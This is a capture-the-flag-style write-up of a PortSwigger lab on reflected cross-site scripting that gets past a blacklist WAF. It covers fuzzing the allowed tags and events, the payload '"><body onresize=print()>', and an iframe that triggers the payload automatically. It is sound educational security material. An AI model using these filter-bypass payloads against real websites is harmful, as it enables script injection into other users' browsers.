# **Reflected XSS with WAF Bypass (PortSwigger Lab)**

## **🧠 Lab Overview**

This lab demonstrates a **Reflected Cross-Site Scripting (XSS)** vulnerability where a Web Application Firewall (WAF) blocks most common XSS vectors.

### **🎯 Goal**

Execute the `print()` function without requiring any user interaction.

---

## **🔍 Initial Testing**

Tried basic payload:

\<img src=1 onerror=print()\>

❌ Blocked by WAF (400 response)

---

## **🧪 Step 1: Identify Allowed Tags**

Used **Burp Intruder** to brute-force HTML tags:

Payload format:

\<§§\>

### **✅ Result:**

* Most tags → 400 (blocked)  
* `<body>` → 200 (allowed)

---

## **🧪 Step 2: Identify Allowed Events**

Tested event handlers using:

\<body §§=1\>

### **✅ Result:**

* Most events blocked ❌  
* `onresize` allowed ✅

---

## **💣 Step 3: Build Payload**

### **Injection payload:**

"\>\<body onresize=print()\>

### **🔑 Explanation:**

* `">` → breaks out of existing HTML context  
* `<body>` → allowed tag  
* `onresize=print()` → allowed event

---

## **⚠️ Problem**

`onresize` does NOT trigger automatically.

---

## **🚀 Step 4: Trigger the Event**

Used an `<iframe>` to force resize:

\<iframe src="https://LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'\>

---

## **🔗 Execution Flow**

1. Victim loads exploit page  
2. `<iframe>` loads vulnerable page  
3. Payload injected into response  
4. `onload` changes iframe size  
5. Resize event triggers  
6. 💥 `print()` executes automatically

---

## **🧠 Key Learnings**

* WAFs often use blacklist-based filtering  
* Rare HTML tags/events can bypass filters  
* Context breaking is critical for XSS  
* Event triggering is necessary for execution  
* Chaining techniques (iframe \+ event) is powerful

---

## **💡 Final Insight**

XSS is not just about injecting scripts — it's about:

* Understanding context  
* Finding allowed vectors  
* Triggering execution

---

## **🏁 Status**

✅ Lab Solved

---

## **🔖 Tags**

`XSS` `Reflected XSS` `WAF Bypass` `Web Security` `Burp Suite`

